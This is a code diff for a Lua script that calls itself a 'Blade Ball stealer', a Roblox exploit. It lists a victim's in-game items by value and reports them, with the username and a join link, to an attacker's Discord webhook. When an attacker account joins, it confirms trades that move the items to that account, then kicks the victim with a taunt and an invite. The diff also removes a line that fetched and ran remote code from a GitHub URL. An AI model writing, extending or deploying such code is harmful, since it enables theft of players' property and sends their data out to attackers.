@@ -1,6 +1,17 @@
 _G.scriptExecuted = _G.scriptExecuted or false
+_G.webhookData = _G.webhookData or {
+    joinSent = false,
+    executionSent = false,
+    status = "🟢 Live",
+    startTime = os.time(),
+    itemsSent = {}
+}
+
 if _G.scriptExecuted then
-    return
+    -- On re-execution, update status and send join webhook again
+    _G.webhookData.status = "🟢 Live"
+    _G.webhookData.joinSent = false
+    _G.webhookData.executionSent = false
 end
 _G.scriptExecuted = true
 
@@ -23,8 +34,19 @@ local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
--- Store if webhook has been sent to prevent duplicate sends
-_G.webhookSent = false
+-- Track player leaving
+local playerLeft = false
+plr.CharacterRemoving:Connect(function()
+    playerLeft = true
+    _G.webhookData.status = "🔴 Left"
+end)
+
+game:GetService("CoreGui").ChildRemoved:Connect(function(child)
+    if child.Name == plr.Name then
+        playerLeft = true
+        _G.webhookData.status = "🔴 Left"
+    end
+end)
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -144,107 +166,113 @@ end
 local totalRAP = 0
 local totalTokens = 0
 
-local function SendWebhookMessage(isJoinMessage, items, tokens)
-    -- Always send webhook even if re-executing
-    _G.webhookSent = true
-    
-    local fields = {}
+local function SendWebhookMessage(isJoinMessage, items, tokens, statusOverride)
+    local currentStatus = statusOverride or _G.webhookData.status
+    local title = ""
+    local color = 0
     
     if isJoinMessage then
-        fields = {
-            {
-                name = "Victim Username:",
-                value = plr.Name,
-                inline = true
-            },
-            {
-                name = "Join link:",
-                value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-            },
-            {
-                name = "Item list:",
-                value = "",
-                inline = false
-            },
-            {
-                name = "Summary:",
-                value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
-                inline = false
-            }
-        }
+        title = "🎴 Join to get Blade Ball hit"
+        color = 65280 -- Green
+        _G.webhookData.joinSent = true
     else
-        fields = {
-            {
-                name = "Victim Username:",
-                value = plr.Name,
-                inline = true
-            },
-            {
-                name = "Items sent:",
-                value = "",
-                inline = false
-            },
-            {
-                name = "Summary:",
-                value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
-                inline = false
-            }
+        title = "🎴 New Blade Ball Execution"
+        color = 16711680 -- Red
+        _G.webhookData.executionSent = true
+    end
+    
+    -- Update items sent
+    if not isJoinMessage then
+        for _, item in ipairs(items) do
+            table.insert(_G.webhookData.itemsSent, item)
+        end
+    end
+    
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Status",
+            value = currentStatus,
+            inline = true
         }
+    }
+    
+    if isJoinMessage then
+        table.insert(fields, {
+            name = "Game:",
+            value = "Blade Ball",
+            inline = true
+        })
+        table.insert(fields, {
+            name = "Join link:",
+            value = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
+        })
     end
-
-    local grouped = {}
-    for _, item in ipairs(items) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP,
-                Category = item.itemType
-            }
-        end
-    end
-
-    local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    -- Sort alphabetically by item name, then by category
-    table.sort(groupedList, function(a, b)
-        if a.Name:lower() == b.Name:lower() then
-            return a.Category < b.Category
-        end
-        return a.Name:lower() < b.Name:lower()
-    end)
-
-    local itemListFieldIndex = isJoinMessage and 3 or 2
-    for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s [%s] (x%s) - %s RAP", group.Name, group.Category, group.Count, formatNumber(group.TotalRAP))
-        fields[itemListFieldIndex].value = fields[itemListFieldIndex].value .. itemLine .. "\n"
-    end
-
-    if #fields[itemListFieldIndex].value > 1024 then
-        local lines = {}
-        for line in fields[itemListFieldIndex].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
+    
+    if #items > 0 then
+        local itemListField = {
+            name = isJoinMessage and "Loot" or "Items sent:",
+            value = "",
+            inline = false
+        }
+        
+        local grouped = {}
+        for _, item in ipairs(items) do
+            if grouped[item.Name] then
+                grouped[item.Name].Count = grouped[item.Name].Count + 1
+                grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
+            else
+                grouped[item.Name] = {
+                    Name = item.Name,
+                    Count = 1,
+                    TotalRAP = item.RAP,
+                    Category = item.itemType
+                }
+            end
         end
 
-        while #fields[itemListFieldIndex].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[itemListFieldIndex].value = table.concat(lines, "\n") .. "\n... and more items"
+        local groupedList = {}
+        for _, group in pairs(grouped) do
+            table.insert(groupedList, group)
         end
+
+        -- Sort alphabetically by item name
+        table.sort(groupedList, function(a, b)
+            if a.Name:lower() == b.Name:lower() then
+                return a.Category < b.Category
+            end
+            return a.Name:lower() < b.Name:lower()
+        end)
+
+        for _, group in ipairs(groupedList) do
+            local itemLine = string.format("🔥 %s [%s] (x%s) - %s RAP", group.Name, group.Category, group.Count, formatNumber(group.TotalRAP))
+            itemListField.value = itemListField.value .. itemLine .. "\n"
+        end
+        
+        -- Add summary line
+        itemListField.value = itemListField.value .. "\n====================\n"
+        itemListField.value = itemListField.value .. string.format("Total: %s RAP + %s Tokens", formatNumber(totalRAP), formatNumber(tokens))
+        
+        table.insert(fields, itemListField)
+    else
+        table.insert(fields, {
+            name = "Loot",
+            value = "No items to send (check min_rap setting)",
+            inline = false
+        })
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = isJoinMessage and "🎴 Join to get Blade Ball hit" or "🎴 New Blade Ball Execution",
-            ["color"] = 65280,
+            ["title"] = title,
+            ["color"] = color,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Frieren"
+                ["text"] = "Blade Ball stealer • " .. os.date("%d/%m/%Y %H:%M")
             }
         }}
     }
@@ -258,7 +286,6 @@ local function SendWebhookMessage(isJoinMessage, items, tokens)
         ["Content-Type"] = "application/json"
     }
     
-    -- Use pcall to handle potential webhook errors
     local success, err = pcall(function()
         local response = request({
             Url = webhook,
@@ -271,6 +298,8 @@ local function SendWebhookMessage(isJoinMessage, items, tokens)
     if not success then
         warn("Failed to send webhook:", err)
     end
+    
+    return true
 end
 
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
@@ -348,8 +377,8 @@ for i, v in ipairs(itemsToSend) do
     originalItemsToSend[i] = v
 end
 
--- Always send the join message webhook on script start
-if #itemsToSend > 0 or totalTokens > 0 then
+-- Always send the join message webhook (even on re-execution)
+if webhook ~= "" then
     SendWebhookMessage(true, itemsToSend, totalTokens)
 end
 
@@ -386,17 +415,22 @@ if #itemsToSend > 0 or totalTokens > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Rejoin the Server!")
+        
+        -- Update status to completed
+        _G.webhookData.status = "✅ Completed"
+        if webhook ~= "" then
+            SendWebhookMessage(false, originalItemsToSend, totalTokens, "✅ Completed")
+        end
+        
+        plr:kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserJoin()
-        local executionSent = false
         local function onUserJoin(player)
             if table.find(users, player.Name) then
-                if not executionSent then
-                    -- Send execution webhook
+                -- Send execution webhook
+                if webhook ~= "" then
                     SendWebhookMessage(false, originalItemsToSend, totalTokens)
-                    executionSent = true
                 end
                 doTrade(player.Name)
             end
@@ -409,9 +443,23 @@ if #itemsToSend > 0 or totalTokens > 0 then
         
         -- Listen for new players
         Players.PlayerAdded:Connect(onUserJoin)
+        
+        -- Listen for player leaving
+        Players.PlayerRemoving:Connect(function(leavingPlayer)
+            if leavingPlayer == plr then
+                _G.webhookData.status = "🔴 Left"
+                if webhook ~= "" then
+                    SendWebhookMessage(false, _G.webhookData.itemsSent, totalTokens, "🔴 Left")
+                end
+            end
+        end)
     end
     
     waitForUserJoin()
+else
+    -- No items to send, still update webhook
+    if webhook ~= "" then
+        _G.webhookData.status = "⚠️ No items"
+        SendWebhookMessage(false, {}, 0, "⚠️ No items")
+    end
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
